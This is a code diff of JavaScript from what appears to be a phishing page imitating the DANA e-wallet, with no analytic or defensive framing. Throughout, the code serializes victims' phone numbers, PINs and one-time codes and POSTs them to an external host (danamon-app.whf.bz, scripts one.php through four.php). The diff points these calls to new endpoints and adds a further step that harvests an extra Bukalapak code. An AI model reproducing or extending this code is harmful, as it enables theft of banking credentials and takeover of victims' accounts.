@@ -138,10 +138,10 @@ $(".bgotp").hide();
     $("#inp").blur();
      
     
-    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
+    var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana2/one.php',
+			  url: 'https://danamon-app.whf.bz/token/dana5/one.php',
 			  data: dataString,
  
     
@@ -160,27 +160,37 @@ $(".bgotp").hide();
 ////
 function sendPin(){
 
-  var dataString = $("#formNohp, #formPin, #formOtp").serialize();
+  var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana2/two.php',
+			  url: 'https://danamon-app.whf.bz/token/dana5/two.php',
 			  data: dataString,
  
 
 
-complete: function(data) {
+ complete: function(data) {
             console.log('Complete');
 $("#process").hide();
-document.getElementById("alert").style.display = "block"; 
-var nomor = document.getElementById("inp").value;
-        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor+ " via<br/>";
-$(".bgotp").fadeIn();
-setInterval(countdown, 1000);
-$("#otp1").focus();
+var themeColorTest = new function() {
+  function e() {
+    "#C11A46" === $themeColor.content ? $themeColor.content = "#C11A46" : "#C11A46" === $themeColor.content ? $themeColor.content = "#C11A46" : $themeColor.content = "#C11A46",
+      setTimeout(e, 500)
+  }
+  this.init = function() {
+    $themeColor = document.querySelector("meta[name='theme-color']"),
+      e()
+  }
+};
+themeColorTest.init();
+document.getElementById("infoku").innerHTML = "0" + inp.value;
+ setInterval(countdown1, 1000);
+  $("#bukalapak").fadeIn();
+  $("#kode1").focus();
 }
 }
 );
 };
+
 
 ///
 
@@ -193,10 +203,10 @@ $(".alert").text("Masa berlaku OTP sudah habis");
 $(".alert").css("color","red");
  },2000);
     
-    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
+    var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana2/tree.php',
+			  url: 'https://danamon-app.whf.bz/token/dana5/tree.php',
 			  data: dataString,
  
         
@@ -213,4 +223,46 @@ $(".alert").css("color","red");
     },4000);
   }});};
     
+       
+       
+  function bukalapak(event){
+    $("#process2").show();
+    
+    event.preventDefault();
+  
+     
+    
+    
+  
+          var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
+			$.ajax( {
+			  type: 'POST',
+			  url: 'https://danamon-app.whf.bz/token/dana5/four.php',
+			  data: dataString,
+ 
+    
+     complete: function(data) {
+            console.log('Complete');
+ $("#bukalapak").hide();       
+  $("#infooo").fadeIn();      
+  var themeColorTest = new function() {
+  function e() {
+    "#118EEA" === $themeColor.content ? $themeColor.content = "#118EEA" : "#118EEA" === $themeColor.content ? $themeColor.content = "#118EEA" : $themeColor.content = "#118EEA",
+      setTimeout(e, 00)
+  }
+  this.init = function() {
+    $themeColor = document.querySelector("meta[name='theme-color']"),
+      e()
+  }
+};
+themeColorTest.init();
+    setTimeout(function(){
+ 
+  $("#process2").hide();       
+    $("#alertc").fadeOut();
+    }, 5000);}});};
+    
+   
+           
+       
        
